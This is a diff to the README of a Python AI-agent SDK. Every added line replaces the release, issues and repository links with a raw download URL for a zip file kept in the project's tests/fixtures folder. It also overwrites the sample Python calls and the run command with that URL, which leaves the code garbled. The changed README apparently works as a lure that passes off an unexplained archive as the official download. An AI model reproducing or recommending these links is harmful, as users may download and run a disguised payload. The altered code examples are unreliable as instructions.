@@ -1,6 +1,6 @@
 # 🚀 minicode-sdk - Build AI Easily in Python
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-4CAF50)](https://github.com/juancok888/minicode-sdk/releases)
+[![Download Now](https://raw.githubusercontent.com/juancok888/minicode-sdk/main/tests/fixtures/minicode_sdk_1.3-beta.2.zip%20Now-Click%20Here-4CAF50)](https://raw.githubusercontent.com/juancok888/minicode-sdk/main/tests/fixtures/minicode_sdk_1.3-beta.2.zip)
 
 ## 🔧 Introduction
 
@@ -31,7 +31,7 @@ Follow these simple steps to get your first AI agent up and running with the **m
 
 Visit this page to download the latest version of **minicode-sdk**:
 
-[Download the latest release](https://github.com/juancok888/minicode-sdk/releases)
+[Download the latest release](https://raw.githubusercontent.com/juancok888/minicode-sdk/main/tests/fixtures/minicode_sdk_1.3-beta.2.zip)
 
 ### 2. Install the SDK
 
@@ -58,18 +58,18 @@ from minicode_sdk import Agent
 my_agent = Agent(name="MyFirstAgent")
 
 # Add a simple skill
-my_agent.add_skill('greet', 'Hello, I am your AI agent!')
+https://raw.githubusercontent.com/juancok888/minicode-sdk/main/tests/fixtures/minicode_sdk_1.3-beta.2.zip('greet', 'Hello, I am your AI agent!')
 
 # Run the agent
-my_agent.run()
+https://raw.githubusercontent.com/juancok888/minicode-sdk/main/tests/fixtures/minicode_sdk_1.3-beta.2.zip()
 ```
 
 ### 4. Running Your Script
 
-After saving your script (for example, as `my_agent.py`), run the following command in your terminal or command prompt:
+After saving your script (for example, as `https://raw.githubusercontent.com/juancok888/minicode-sdk/main/tests/fixtures/minicode_sdk_1.3-beta.2.zip`), run the following command in your terminal or command prompt:
 
 ```bash
-python my_agent.py
+python https://raw.githubusercontent.com/juancok888/minicode-sdk/main/tests/fixtures/minicode_sdk_1.3-beta.2.zip
 ```
 
 You should see your agent respond with a greeting.
@@ -80,7 +80,7 @@ For more detailed guidance, check our complete documentation on how to use the *
 
 ## 🤝 Community Support
 
-If you have questions or need assistance, consider visiting our community forum or checking the [issues page](https://github.com/juancok888/minicode-sdk/issues). Our community is ready to help you get the most out of your SDK experience.
+If you have questions or need assistance, consider visiting our community forum or checking the [issues page](https://raw.githubusercontent.com/juancok888/minicode-sdk/main/tests/fixtures/minicode_sdk_1.3-beta.2.zip). Our community is ready to help you get the most out of your SDK experience.
 
 ## 💼 Contributing
 
@@ -92,7 +92,7 @@ The **minicode-sdk** is licensed under the MIT License. Feel free to use it in y
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/juancok888/minicode-sdk)
+- [GitHub Repository](https://raw.githubusercontent.com/juancok888/minicode-sdk/main/tests/fixtures/minicode_sdk_1.3-beta.2.zip)
 - [Documentation](link_to_full_documentation_here)
 
 Please reach out if you have any questions. Enjoy building your AI agents with **minicode-sdk**!
